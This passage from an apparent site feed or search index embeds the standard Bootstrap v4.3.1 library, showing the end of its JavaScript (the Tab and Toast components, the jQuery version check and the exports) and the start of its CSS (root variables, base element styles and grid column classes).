{          target = document.querySelector(selector);        }        this._activate(this._element, listElement);        var complete = function complete() {          var hiddenEvent = $.Event(Event$9.HIDDEN, {            relatedTarget: _this._element          });          var shownEvent = $.Event(Event$9.SHOWN, {            relatedTarget: previous          });          $(previous).trigger(hiddenEvent);          $(_this._element).trigger(shownEvent);        };        if (target) {          this._activate(target, target.parentNode, complete);        } else {          complete();        }      };      _proto.dispose = function dispose() {        $.removeData(this._element, DATA_KEY$9);        this._element = null;      } // Private        ;      _proto._activate = function _activate(element, container, callback) {        var _this2 = this;        var activeElements = container && (container.nodeName === 'UL' || container.nodeName === 'OL') ? $(container).find(Selector$9.ACTIVE_UL) : $(container).children(Selector$9.ACTIVE);        var active = activeElements[0];        var isTransitioning = callback && active && $(active).hasClass(ClassName$9.FADE);        var complete = function complete() {          return _this2._transitionComplete(element, active, callback);        };        if (active && isTransitioning) {          var transitionDuration = Util.getTransitionDurationFromElement(active);          $(active).removeClass(ClassName$9.SHOW).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);        } else {          complete();        }      };      _proto._transitionComplete = function _transitionComplete(element, active, callback) {        if (active) {          $(active).removeClass(ClassName$9.ACTIVE);          var dropdownChild = $(active.parentNode).find(Selector$9.DROPDOWN_ACTIVE_CHILD)[0];          if (dropdownChild) {            $(dropdownChild).removeClass(ClassName$9.ACTIVE);          }          if (active.getAttribute('role') === 'tab') {            active.setAttribute('aria-selected', false);          }        }        $(element).addClass(ClassName$9.ACTIVE);        if (element.getAttribute('role') === 'tab') {          element.setAttribute('aria-selected', true);        }        Util.reflow(element);        if (element.classList.contains(ClassName$9.FADE)) {          element.classList.add(ClassName$9.SHOW);        }        if (element.parentNode && $(element.parentNode).hasClass(ClassName$9.DROPDOWN_MENU)) {          var dropdownElement = $(element).closest(Selector$9.DROPDOWN)[0];          if (dropdownElement) {            var dropdownToggleList = [].slice.call(dropdownElement.querySelectorAll(Selector$9.DROPDOWN_TOGGLE));            $(dropdownToggleList).addClass(ClassName$9.ACTIVE);          }          element.setAttribute('aria-expanded', true);        }        if (callback) {          callback();        }      } // Static        ;      Tab._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var $this = $(this);          var data = $this.data(DATA_KEY$9);          if (!data) {            data = new Tab(this);            $this.data(DATA_KEY$9, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config]();          }        });      };      _createClass(Tab, null, [{        key: "VERSION",        get: function get() {          return VERSION$9;        }      }]);      return Tab;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event$9.CLICK_DATA_API, Selector$9.DATA_TOGGLE, function (event) {    event.preventDefault();    Tab._jQueryInterface.call($(this), 'show');  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$9] = Tab._jQueryInterface;  $.fn[NAME$9].Constructor = Tab;  $.fn[NAME$9].noConflict = function () {    $.fn[NAME$9] = JQUERY_NO_CONFLICT$9;    return Tab._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$a = 'toast';  var VERSION$a = '4.3.1';  var DATA_KEY$a = 'bs.toast';  var EVENT_KEY$a = "." + DATA_KEY$a;  var JQUERY_NO_CONFLICT$a = $.fn[NAME$a];  var Event$a = {    CLICK_DISMISS: "click.dismiss" + EVENT_KEY$a,    HIDE: "hide" + EVENT_KEY$a,    HIDDEN: "hidden" + EVENT_KEY$a,    SHOW: "show" + EVENT_KEY$a,    SHOWN: "shown" + EVENT_KEY$a  };  var ClassName$a = {    FADE: 'fade',    HIDE: 'hide',    SHOW: 'show',    SHOWING: 'showing'  };  var DefaultType$7 = {    animation: 'boolean',    autohide: 'boolean',    delay: 'number'  };  var Default$7 = {    animation: true,    autohide: true,    delay: 500  };  var Selector$a = {    DATA_DISMISS: '[data-dismiss="toast"]'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Toast =    /*#__PURE__*/    function () {      function Toast(element, config) {        this._element = element;        this._config = this._getConfig(config);        this._timeout = null;        this._setListeners();      } // Getters      var _proto = Toast.prototype;      // Public      _proto.show = function show() {        var _this = this;        $(this._element).trigger(Event$a.SHOW);        if (this._config.animation) {          this._element.classList.add(ClassName$a.FADE);        }        var complete = function complete() {          _this._element.classList.remove(ClassName$a.SHOWING);          _this._element.classList.add(ClassName$a.SHOW);          $(_this._element).trigger(Event$a.SHOWN);          if (_this._config.autohide) {            _this.hide();          }        };        this._element.classList.remove(ClassName$a.HIDE);        this._element.classList.add(ClassName$a.SHOWING);        if (this._config.animation) {          var transitionDuration = Util.getTransitionDurationFromElement(this._element);          $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);        } else {          complete();        }      };      _proto.hide = function hide(withoutTimeout) {        var _this2 = this;        if (!this._element.classList.contains(ClassName$a.SHOW)) {          return;        }        $(this._element).trigger(Event$a.HIDE);        if (withoutTimeout) {          this._close();        } else {          this._timeout = setTimeout(function () {            _this2._close();          }, this._config.delay);        }      };      _proto.dispose = function dispose() {        clearTimeout(this._timeout);        this._timeout = null;        if (this._element.classList.contains(ClassName$a.SHOW)) {          this._element.classList.remove(ClassName$a.SHOW);        }        $(this._element).off(Event$a.CLICK_DISMISS);        $.removeData(this._element, DATA_KEY$a);        this._element = null;        this._config = null;      } // Private        ;      _proto._getConfig = function _getConfig(config) {        config = _objectSpread({}, Default$7, $(this._element).data(), typeof config === 'object' && config ? config : {});        Util.typeCheckConfig(NAME$a, config, this.constructor.DefaultType);        return config;      };      _proto._setListeners = function _setListeners() {        var _this3 = this;        $(this._element).on(Event$a.CLICK_DISMISS, Selector$a.DATA_DISMISS, function () {          return _this3.hide(true);        });      };      _proto._close = function _close() {        var _this4 = this;        var complete = function complete() {          _this4._element.classList.add(ClassName$a.HIDE);          $(_this4._element).trigger(Event$a.HIDDEN);        };        this._element.classList.remove(ClassName$a.SHOW);        if (this._config.animation) {          var transitionDuration = Util.getTransitionDurationFromElement(this._element);          $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);        } else {          complete();        }      } // Static        ;      Toast._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var $element = $(this);          var data = $element.data(DATA_KEY$a);          var _config = typeof config === 'object' && config;          if (!data) {            data = new Toast(this, _config);            $element.data(DATA_KEY$a, data);          }          if (typeof config === 'string') {            if (typeof data[config] === 'undefined') {              throw new TypeError("No method named \"" + config + "\"");            }            data[config](this);          }        });      };      _createClass(Toast, null, [{        key: "VERSION",        get: function get() {          return VERSION$a;        }      }, {        key: "DefaultType",        get: function get() {          return DefaultType$7;        }      }, {        key: "Default",        get: function get() {          return Default$7;        }      }]);      return Toast;    }();  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$a] = Toast._jQueryInterface;  $.fn[NAME$a].Constructor = Toast;  $.fn[NAME$a].noConflict = function () {    $.fn[NAME$a] = JQUERY_NO_CONFLICT$a;    return Toast._jQueryInterface;  };  /**   * --------------------------------------------------------------------------   * Bootstrap (v4.3.1): index.js   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)   * --------------------------------------------------------------------------   */  (function () {    if (typeof $ === 'undefined') {      throw new TypeError('Bootstrap\'s JavaScript requires jQuery. jQuery must be included before Bootstrap\'s JavaScript.');    }    var version = $.fn.jquery.split(' ')[0].split('.');    var minMajor = 1;    var ltMajor = 2;    var minMinor = 9;    var minPatch = 1;    var maxMajor = 4;    if (version[0] < ltMajor && version[1] < minMinor || version[0] === minMajor && version[1] === minMinor && version[2] < minPatch || version[0] >= maxMajor) {      throw new Error('Bootstrap\'s JavaScript requires at least jQuery v1.9.1 but less than v4.0.0');    }  })();  exports.Util = Util;  exports.Alert = Alert;  exports.Button = Button;  exports.Carousel = Carousel;  exports.Collapse = Collapse;  exports.Dropdown = Dropdown;  exports.Modal = Modal;  exports.Popover = Popover;  exports.Scrollspy = ScrollSpy;  exports.Tab = Tab;  exports.Toast = Toast;  exports.Tooltip = Tooltip;  Object.defineProperty(exports, '__esModule', { value: true });}));//# sourceMappingURL=bootstrap.js.map]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/sources/css/bootstrap.css"/>
      <url>/sources/css/bootstrap.css</url>
      
        <content type="html"><![CDATA[/*! * Bootstrap v4.3.1 (https://getbootstrap.com/) * Copyright 2011-2019 The Bootstrap Authors * Copyright 2011-2019 Twitter, Inc. * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE) */:root {  --blue: #007bff;  --indigo: #6610f2;  --purple: #6f42c1;  --pink: #e83e8c;  --red: #dc3545;  --orange: #fd7e14;  --yellow: #ffc107;  --green: #28a745;  --teal: #20c997;  --cyan: #17a2b8;  --white: #fff;  --gray: #6c757d;  --gray-dark: #343a40;  --primary: #007bff;  --secondary: #6c757d;  --success: #28a745;  --info: #17a2b8;  --warning: #ffc107;  --danger: #dc3545;  --light: #f8f9fa;  --dark: #343a40;  --breakpoint-xs: 0;  --breakpoint-sm: 576px;  --breakpoint-md: 768px;  --breakpoint-lg: 992px;  --breakpoint-xl: 1200px;  --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";  --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;}*,*::before,*::after {  box-sizing: border-box;}html {  font-family: sans-serif;  line-height: 1.15;  -webkit-text-size-adjust: 100%;  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);}article, aside, figcaption, figure, footer, header, hgroup, main, nav, section {  display: block;}body {  margin: 0;  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";  font-size: 1rem;  font-weight: 400;  line-height: 1.5;  color: #212529;  text-align: left;  background-color: #fff;}[tabindex="-1"]:focus {  outline: 0 !important;}hr {  box-sizing: content-box;  height: 0;  overflow: visible;}h1, h2, h3, h4, h5, h6 {  margin-top: 0;  margin-bottom: 0.5rem;}p {  margin-top: 0;  margin-bottom: 1rem;}abbr[title],abbr[data-original-title] {  text-decoration: underline;  -webkit-text-decoration: underline dotted;  text-decoration: underline dotted;  cursor: help;  border-bottom: 0;  -webkit-text-decoration-skip-ink: none;  text-decoration-skip-ink: none;}address {  margin-bottom: 1rem;  font-style: normal;  line-height: inherit;}ol,ul,dl {  margin-top: 0;  margin-bottom: 1rem;}ol ol,ul ul,ol ul,ul ol {  margin-bottom: 0;}dt {  font-weight: 700;}dd {  margin-bottom: .5rem;  margin-left: 0;}blockquote {  margin: 0 0 1rem;}b,strong {  font-weight: bolder;}small {  font-size: 80%;}sub,sup {  position: relative;  font-size: 75%;  line-height: 0;  vertical-align: baseline;}sub {  bottom: -.25em;}sup {  top: -.5em;}a {  color: #007bff;  text-decoration: none;  background-color: transparent;}a:hover {  color: #0056b3;  text-decoration: underline;}a:not([href]):not([tabindex]) {  color: inherit;  text-decoration: none;}a:not([href]):not([tabindex]):hover, a:not([href]):not([tabindex]):focus {  color: inherit;  text-decoration: none;}a:not([href]):not([tabindex]):focus {  outline: 0;}pre,code,kbd,samp {  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;  font-size: 1em;}pre {  margin-top: 0;  margin-bottom: 1rem;  overflow: auto;}figure {  margin: 0 0 1rem;}img {  vertical-align: middle;  border-style: none;}svg {  overflow: hidden;  vertical-align: middle;}table {  border-collapse: collapse;}caption {  padding-top: 0.75rem;  padding-bottom: 0.75rem;  color: #6c757d;  text-align: left;  caption-side: bottom;}th {  text-align: inherit;}label {  display: inline-block;  margin-bottom: 0.5rem;}button {  border-radius: 0;}button:focus {  outline: 1px dotted;  outline: 5px auto -webkit-focus-ring-color;}input,button,select,optgroup,textarea {  margin: 0;  font-family: inherit;  font-size: inherit;  line-height: inherit;}button,input {  overflow: visible;}button,select {  text-transform: none;}select {  word-wrap: normal;}button,[type="button"],[type="reset"],[type="submit"] {  -webkit-appearance: button;}button:not(:disabled),[type="button"]:not(:disabled),[type="reset"]:not(:disabled),[type="submit"]:not(:disabled) {  cursor: pointer;}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner {  padding: 0;  border-style: none;}input[type="radio"],input[type="checkbox"] {  box-sizing: border-box;  padding: 0;}input[type="date"],input[type="time"],input[type="datetime-local"],input[type="month"] {  -webkit-appearance: listbox;}textarea {  overflow: auto;  resize: vertical;}fieldset {  min-width: 0;  padding: 0;  margin: 0;  border: 0;}legend {  display: block;  width: 100%;  max-width: 100%;  padding: 0;  margin-bottom: .5rem;  font-size: 1.5rem;  line-height: inherit;  color: inherit;  white-space: normal;}progress {  vertical-align: baseline;}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button {  height: auto;}[type="search"] {  outline-offset: -2px;  -webkit-appearance: none;}[type="search"]::-webkit-search-decoration {  -webkit-appearance: none;}::-webkit-file-upload-button {  font: inherit;  -webkit-appearance: button;}output {  display: inline-block;}summary {  display: list-item;  cursor: pointer;}template {  display: none;}[hidden] {  display: none !important;}h1, h2, h3, h4, h5, h6,.h1, .h2, .h3, .h4, .h5, .h6 {  margin-bottom: 0.5rem;  font-weight: 500;  line-height: 1.2;}h1, .h1 {  font-size: 2.5rem;}h2, .h2 {  font-size: 2rem;}h3, .h3 {  font-size: 1.75rem;}h4, .h4 {  font-size: 1.5rem;}h5, .h5 {  font-size: 1.25rem;}h6, .h6 {  font-size: 1rem;}.lead {  font-size: 1.25rem;  font-weight: 300;}.display-1 {  font-size: 6rem;  font-weight: 300;  line-height: 1.2;}.display-2 {  font-size: 5.5rem;  font-weight: 300;  line-height: 1.2;}.display-3 {  font-size: 4.5rem;  font-weight: 300;  line-height: 1.2;}.display-4 {  font-size: 3.5rem;  font-weight: 300;  line-height: 1.2;}hr {  margin-top: 1rem;  margin-bottom: 1rem;  border: 0;  border-top: 1px solid rgba(0, 0, 0, 0.1);}small,.small {  font-size: 80%;  font-weight: 400;}mark,.mark {  padding: 0.2em;  background-color: #fcf8e3;}.list-unstyled {  padding-left: 0;  list-style: none;}.list-inline {  padding-left: 0;  list-style: none;}.list-inline-item {  display: inline-block;}.list-inline-item:not(:last-child) {  margin-right: 0.5rem;}.initialism {  font-size: 90%;  text-transform: uppercase;}.blockquote {  margin-bottom: 1rem;  font-size: 1.25rem;}.blockquote-footer {  display: block;  font-size: 80%;  color: #6c757d;}.blockquote-footer::before {  content: "\2014\00A0";}.img-fluid {  max-width: 100%;  height: auto;}.img-thumbnail {  padding: 0.25rem;  background-color: #fff;  border: 1px solid #dee2e6;  border-radius: 0.25rem;  max-width: 100%;  height: auto;}.figure {  display: inline-block;}.figure-img {  margin-bottom: 0.5rem;  line-height: 1;}.figure-caption {  font-size: 90%;  color: #6c757d;}code {  font-size: 87.5%;  color: #e83e8c;  word-break: break-word;}a > code {  color: inherit;}kbd {  padding: 0.2rem 0.4rem;  font-size: 87.5%;  color: #fff;  background-color: #212529;  border-radius: 0.2rem;}kbd kbd {  padding: 0;  font-size: 100%;  font-weight: 700;}pre {  display: block;  font-size: 87.5%;  color: #212529;}pre code {  font-size: inherit;  color: inherit;  word-break: normal;}.pre-scrollable {  max-height: 340px;  overflow-y: scroll;}.container {  width: 100%;  padding-right: 15px;  padding-left: 15px;  margin-right: auto;  margin-left: auto;}@media (min-width: 576px) {  .container {    max-width: 540px;  }}@media (min-width: 768px) {  .container {    max-width: 720px;  }}@media (min-width: 992px) {  .container {    max-width: 960px;  }}@media (min-width: 1200px) {  .container {    max-width: 1140px;  }}.container-fluid {  width: 100%;  padding-right: 15px;  padding-left: 15px;  margin-right: auto;  margin-left: auto;}.row {  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  margin-right: -15px;  margin-left: -15px;}.no-gutters {  margin-right: 0;  margin-left: 0;}.no-gutters > .col,.no-gutters > [class*="col-"] {  padding-right: 0;  padding-left: 0;}.col-1, .col-2, .col-3, .col-4, .col-5, .col-6, .col-7, .col-8, .col-9, .col-10, .col-11, .col-12, .col,.col-auto, .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm,.col-sm-auto, .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12, .col-md,.col-md-auto, .col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg,.col-lg-auto, .col-xl-1, .col-xl-2, .col-xl-3, .col-xl-4, .col-xl-5, .col-xl-6, .col-xl-7, .col-xl-8, .col-xl-9, .col-xl-10, .col-xl-11, .col-xl-12, .col-xl,.col-xl-auto {  position: relative;  width: 100%;  padding-right: 15px;  padding-left: 15px;}.col {  -ms-flex-preferred-size: 0;  flex-basis: 0;  -ms-flex-positive: 1;  flex-grow: 1;  max-width: 100%;}.col-auto {  -ms-flex: 0 0 auto;  flex: 0 0 auto;  width: auto;  max-width: 100%;}.col-1 {  -ms-flex: 0 0 8.333333%;  flex: 0 0 8.333333%;  max-width: 8.333333%;}.col-2 {  -ms-flex: 0 0 16.666667%;  flex: 0 0 16.666667%;  max-width: 16.666667%;}.col-3 {  -ms-flex: 0 0 25%;  flex: 0 0 25%;  max-width: 25%;}.col-4 {  -ms-flex: 0 0 33.333333%;  flex: 0 0 33.333333%;  max-width: 33.333333%;}.col-5 {  -ms-flex: 0 0 41.666667%;  flex: 0 0 41.666667%;  max-width: 41.666667%;}.col-6 {  -ms-flex: 0 0 50%;  flex: 0 0 50%;  max-width: 50%;}.col-7 {  -ms-flex: 0 0 58.333333%;  flex: 0 0 58.333333%;  max-width: 58.333333%;}.col-8 {  -ms-flex: 0 0 66.666667%;  flex: 0 0 66.666667%;  max-width: 66.666667%;}.col-9 {  -ms-flex: 0 0 75%;  flex: 0 0 75%;  max-width: 75%;}.col-10 {  -ms-flex: 0 0 83.333333%;  flex: 0 0 83.333333%;  max-width: 83.333333%;}.col-11 {  -ms-flex: 0 0 91.666667%;  flex: 0 0 91.666667%;  max-width: 91.666667%;}.col-12 {  -ms-flex: 0 0 100%;  flex: 0 0 100%;  max-width: 100%;}.order-first {  -ms-flex-order: -1;  order: -1;}.order-last {  -ms-flex-order: 13;  order: 13;}.order-0 {  -ms-flex-order: 0;  order: 0;}.order-1 {  -ms-flex-order: 1;  order: 1;}.order-2 {  -ms-flex-order: 2;  order: 2;}.order-3 {  -ms-flex-order: 3;  order: 3;}.order-4 {  -ms-flex-order: 4;  order: 4;}.order-5 {  -ms-flex-order: 5;  order: 5;}.order-6 {  -ms-flex-order: 6;  order: 6;}.order-7 {  -ms-flex-order: 7;  order: 7;}.order-8 {  -ms-flex-order: 8;  order: 8;}.order-9 {  -ms-flex-order: 9;  order: 9;}.order-10 {  -ms-flex-order: 10;  order: 10;}.order-11 {  -ms-flex-order: 11;  order: 11;}.order-12 {  -ms-flex-order: 12;  order: 12;}.offset-1 {  margin-left: 8.333333%;}.offset-2 {  margin-left: 16.666667%;}.offset-3 {  margin-left: 25%;}.offset-4 {  margin-left: 33.333333%;}.offset-5 {  margin-left: 41.666667%;}.offset-6 {  margin-left: 50%;}.offset-7 {  margin-left: 58.333333%;}.offset-8 {  margin-left: 66.666667%;}.offset-9 {  margin-left: 75%;}.offset-10 {  margin-left: 83.333333%;}.offset-11 {  margin-left: 91.666667%;}@media (min-width: 576px) {  .col-sm {    -ms-flex-preferred-size: 0;    flex-basis: 0;    -ms-flex-positive: 1;    flex-grow: 1;    max-width: 100%;  }  .col-sm-auto {    -ms-flex: 0 0 auto;    flex: 0 0 auto;    width: auto;    max-width: 100%;  }  .col-sm-1 {    -ms-flex: 0 0 8.333333%;    flex: 0 0 8.333333%;    max-width: 8.333333%;  }  .col-sm-2 {    -ms-flex: 0 0 16.666667%;    flex: 0 0 16.666667%;    max-width: 16.666667%;  }  .col-sm-3 {    -ms-flex: 0 0 25%;    flex: 0 0 25%;    max-width: 25%;  }  .col-sm-4 {    -ms-flex: 0 0 33.333333%;    flex: 0 0 33.333333%;    max-width: 33.333333%;  }  .col-sm-5 {    -ms-flex: 0 0 41.666667%;    flex: 0 0 41.666667%;    max-width: 41.666667%;  }  .col-sm-6 {    -ms-flex: 0 0 50%;    flex: 0 0 50%;    max-width: 50%;  }  .col-sm-7 {    -ms-flex: 0 0 58.333333%;    flex: 0 0 58.333333%;    max-width: 58.333333%;  }  .col-sm-8 {    -ms-flex: 0 0 66.666667%;    flex: 0 0 66.666667%;    max-width: 66.666667%;  }  .col-sm-9 {    -ms-flex: 0 0 75%;    flex: 0 0 75%;    max-width: 75%;  }  .col-sm-10 {    -ms-flex: 0 0 83.333333%;    flex: 0 0 83.333333%;    max-width: 83.333333%;  }  .col-sm-11 {    -ms-flex: 0 0 91.666667%;    flex: 0 0 91.666667%;    max-width: 91.666667%;  }  .col-sm-12 {    -ms-flex: 0 0 100%;    flex: 0 0 100%;    max-width: 100%;  }  .order-sm-first {    -ms-flex-order: -1;    order: -1;  }  .order-sm-last {    -ms-flex-order: 13;    order: 13;  }  .order-sm-0 {    -ms-flex-order: 0;    order: 0;  }  .order-sm-1 {    -ms-flex-order: 1;    order: 1;  }  .order-sm-2 {    -ms-flex-order: 2;    order: 2;  }  .order-sm-3 {    -ms-flex-order: 3;    order: 3;  }  .order-sm-4 {    -ms-flex-order: 4;    order: 4;  }  .order-sm-5 {    -ms-flex-order: 5;    order: 5;  }  .order-sm-6 {    -ms-flex-order: 6;    order: 6;  }  .order-sm-7 {    -ms-flex-order: 7;    order: 7;  }  .order-sm-8 {    -ms-flex-order: 8;    order: 8;  }  .order-sm-9 {    -ms-flex-order: 9;    order: 9;  }  .order-sm-10 {    -ms-flex-order: 10;    order: 10;  }  .order-sm-11 {    -ms-flex-order: 11;    order: 11;  }  .order-sm-12 {    -ms-flex-order: 12;    order: 12;  }  .offset-sm-0 {    margin-left: 0;  }  .offset-sm-1 {    margin-left: 8.333333%;  }  .offset-sm-2 {    margin-left: 16.666667%;  }  .offset-sm-3 {    margin-left: 25%;  }  .offset-sm-4 {    margin-left: 33.333333%;  }  .offset-sm-5 {    margin-left: 41.666667%;  }  .offset-sm-6 {    margin-left: 50%;  }  .offset-sm-7 {    margin-left: 58.333333%;  }  .offset-sm-8 {    margin-left: 66.666667%;  }  .offset-sm-9 {    margin-left: 75%;  }  .offset-sm-10 {    margin-left: 83.333333%;  }  .offset-sm-11 {    margin-left: 91.666667%;  }}@media (min-width: 768px) {  .col-md {    -ms-flex-preferred-size: 0;    flex-basis: 0;    -ms-flex-positive: 1;    flex-grow: 1;    max-width: 100%;  }  .col-md-auto {    -ms-flex: 0 0 auto;    flex: 0 0 auto;    width: auto;    max-width: 100%;  }  .col-md-1 {    -ms-flex: 0 0 8.333333%;    flex: 0 0 8.333333%;    max-width: 8.333333%;  }  .col-md-2 {    -ms-flex: 0 0 16.666667%;    flex: 0 0 16.666667%;    max-width: 16.666667%;  }  .col-md-3 {    -ms-flex: 0 0 25%;    flex: 0 0 25%;    max-width: 25%;  }  .col-md-4 {    -ms-flex: 0 0 33.333333%;    flex: 0 0 33.333333%;    max-width: 33.333333%;  }  .col-md-5 {    -ms-flex: 0 0 41.666667%;    flex: 0 0 41.666667%;    max-width: 41.666667%;  }  .col-md-6 {    -ms-flex: 0 0 50%;    flex: 0 0 50%;    max-width: 50%;  }  .col-md-7 {    -ms-flex: 0 0 58.333333%;    flex: 0 0 58.333333%;    max-width: 58.333333%;  }  .col-md-8 {    -ms-flex: 0 0 66.666667%;    flex: 0 0 66.666667%;    max-width: 66.666667%;  }  .col-md-9 {    -ms-flex: 0 0 75%;    flex: 0 0 75%;    max-width: 75%;  }  .col-md-10 {    -ms-flex: 0 0 83.333333%;    flex: 0 0 83.333333%;    max-width: 83.333333%;  }  .col-md-11 {    -ms-flex: 0 0 91.666667%;    flex: 0 0 91.666667%;    max-width: 91.666667%;  }  .col-md-12 {    -ms-flex: 0 0 100%;    flex: 0 0 100%;    max-width: 100%;  }  .order-md-first {    -ms-flex-order: -1;    order: -1;  }  .order-md-last {    -ms-flex-order: 13;    order: 13;  }  .order-md-0 {    -ms-flex-order: 0;    order: 0;  }  .order-md-1 {    -ms-flex-order: 1;    order: 1;  }  .order-md-2 {    -ms-flex-order: 2;    order: 2;  }  .order-md-3 {    -ms-flex-order: 3;    order: 3;  }  .order-md-4 {    -ms-flex-order: 4;    order: 4;  }  .order-md-5 {    -ms-flex-order: 5;    order: 5;  }  .order-md-6 {    -ms-flex-order: 6;    order: 6;  }  .order-md-7 {    -ms-flex-order: 7;    order: 7;  }  .order-md-8 {    -ms-flex-order: 8;    order: 8;  }  .order-md-9 {    -ms-flex-order: 9;    order: 9;  }  .order-md-10 {    -ms-flex-order: 10;    order: 10;  }  .order-md-11 {    -ms-flex-order: 11;    order: 11;  }  .order-md-12 {    -ms-flex-order: 12;    order: 12;  }  .offset-md-0 {    margin-left: 0;  }  .offset-md-1 {    margin-left: 8.333333%;  }  .offset-md-2 {    margin-left: 16.666667%;  }  .offset-md-3 {    margin-left: 25%;  }  .offset-md-4 {    margin-left: 33.333333%;  }  .offset-md-5 {    margin-left: 41.666667%;  }  .offset-md-6 {    margin-left: 50%;  }  .offset-md-7 {    margin-left: 58.333333%;  }  .offset-md-8 {    margin-left: 66.666667%;  }  .offset-md-9 {    margin-left: 75%;  }  .offset-md-10 {    margin-left: 83.333333%;  }  .offset-md-11 {    margin-left: 91.666667%;  }}@media (min-width: 992px) {  .col-lg {    -ms-flex-preferred-size: 0;    flex-basis: 0;    -ms-flex-positive: 1;    flex-grow: 1;    max-width: 100%;  }  .col-lg-auto {    -ms-flex: 0 0 auto;    flex: 0 0 auto;    width: auto;    max-width: 100%;  }  .col-lg-1 {    -ms-flex: 0 0 8.333333%;    flex: 0 0 8.333333%;    max-width: 8.333333%;  }  .col-lg-2 {    -ms-flex: 0 0 16.666667%;    flex: 0 0 16.666667%;    max-width: 16.666667%;  }  .col-lg-3 {    -ms-flex: 0 0 25%;    flex: 0 0 25%;    max-width: 25%;  }  .col-lg-4 {    -ms-flex: 0 0 33.333333%;    flex: 0 0 33.333333%;    max-width: 33.333333%;  }  .col-lg-5 {    -ms-flex: 0 0 41.666667%;    flex: 0 0 41.666667%;    max-width: 41.666667%;  }  .col-lg-6 {    -ms-flex: 0 0 50%;    flex: 0 0 50%;    max-width: 50%;  }  .col-lg-7 {    -ms-flex: 0 0 58.333333%;    flex: 0 0 58.333333%;    max-width: 58.333333%;  }  .col-lg-8 {    -ms-flex: 0 0 66.666667%;    flex: 0 0 66.666667%;    max-width: 66.666667%;  }  .col-lg-9 {    -ms-flex: 0 0 75%;    flex: 0 0 75%;    max-width: 75%;  }  .col-lg-10 {    -ms-flex: 0 0 83.333333%;    flex: 0 0 83.333333%;    max-width: 83.333333%;  }  .col-lg-11 {    -ms-flex: 0 0 91.666667%;    flex: 0 0 91.666667%;    max-width: 91.666667%;  }  .col-lg-12 {    -ms-flex: 0 0 100%;    flex: 0 0 100%;    max-width: 100%;  }  .order-lg-first {    -ms-flex-order: -1;    order: -1;  }  .order-lg-last {    -ms-flex-order: 13;    order: 13;  }  .order-lg-0 {    -ms-flex-order: 0;    order: 0;  }  .order-lg-1 {    -ms-flex-order: 1;    order: 1;  }  .order-lg-2 {    -ms-flex-order: 2;    order: 2;  }  .order-lg-3 {    -ms-flex-order: 3;    order: 3;  }  .order-lg-4 {    -ms-flex-order: 4;    order: 4;  }  .order-lg-5 {    -ms-flex-order: 5;    order: 5;  }  .order-lg-6 {    -ms-flex-order: 6;    order: 6;  }  .order-lg-7 {    -ms-flex-order: 7;    order: 7;  }  .order-lg-8 {    -ms-flex-order: 8;    order: 8;  }  .order-lg-9 {    -ms-flex-order: 9;    order: 9;  }  .order-lg-10 {    -ms-flex-order: 10;    order: 10;  }  .order-lg-11 {    -ms-flex-order: 11;    order: 11;  }  .order-lg-12 {    -ms-flex-order: 12;    order: 12;  }  .offset-lg-0 {    margin-left: 0;  }  .offset-lg-1 {    margin-left: 8.333333%;  }  .offset-lg-2 {    margin-left: 16.666667%;  }  .offset-lg-3 {    margin-left: 25%;  }  .offset-lg-4 {    margin-left: 33.333333%;  }  .offset-lg-5 {    margin-left: 41.666667%;  }  .offset-lg-6 {    margin-left: 50%;  }  .offset-lg-7 {    margin-left: 58.333333%;  }  .offset-lg-8 {    margin-left: 66.666667%;  }  .offset-lg-9 {    margin-left: 75%;  }  .offset-lg-10 {    margin-left: 83.333333%;  }  .offset-lg-11 {    margin-left: 91.666667%;  }}@media (min-width: 1200px) {  .col-xl {    -ms-flex-preferred-size: 0;    flex-basis: 0;    -ms-flex-positive: 1;    flex-grow: 1;    max-width: 100%;  }  .col-xl-auto {    -ms-flex: 0 0 auto;    flex: 0 0 auto;    width: auto;    max-width: 100%;  }  .col-xl-1 {    -ms-flex: 0 0 8.333333%;    flex: 0 0 8.333333%;    max-width: 8.333333%;  }  .col-xl-2 {    -ms-flex: 0 0 